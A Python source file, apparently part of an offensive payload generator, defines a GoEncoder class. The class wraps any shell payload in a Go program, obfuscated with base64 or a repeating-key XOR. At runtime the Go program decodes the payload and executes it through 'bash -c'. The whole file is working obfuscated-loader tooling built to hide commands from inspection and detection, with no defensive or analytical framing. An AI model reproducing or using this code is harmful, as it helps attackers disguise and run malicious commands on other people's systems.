import base64
from .base_encoder import BaseEncoder

class GoEncoder(BaseEncoder):
    """Go specific encoder"""
    
    def encode(self, payload: str, method: str) -> str:
        if method == "base64":
            return self._base64_wrapper(payload)
        elif method == "xor":
            return self._xor_wrapper(payload)
        else:
            return payload
    
    def _base64_wrapper(self, payload: str) -> str:
        """Base64 encode Go payload"""
        encoded = base64.b64encode(payload.encode()).decode()
        return f"""
package main

import (
    "encoding/base64"
    "os/exec"
)

func main() {{
    encoded := "{encoded}"
    decoded, _ := base64.StdEncoding.DecodeString(encoded)
    cmd := exec.Command("bash", "-c", string(decoded))
    cmd.Run()
}}
"""
    
    def _xor_wrapper(self, payload: str, key: str = "0xD4") -> str:
        """XOR encode Go payload"""
        encoded = []
        for i, c in enumerate(payload):
            encoded.append(ord(c) ^ ord(key[i % len(key)]))
        encoded_bytes = bytes(encoded)
        encoded_str = base64.b64encode(encoded_bytes).decode()
        
        return f"""
package main

import (
    "encoding/base64"
    "os/exec"
)

func main() {{
    key := "{key}"
    encoded, _ := base64.StdEncoding.DecodeString("{encoded_str}")
    decoded := make([]byte, len(encoded))
    
    for i := range encoded {{
        decoded[i] = encoded[i] ^ key[i % len(key)]
    }}
    
    cmd := exec.Command("bash", "-c", string(decoded))
    cmd.Run()
}}
"""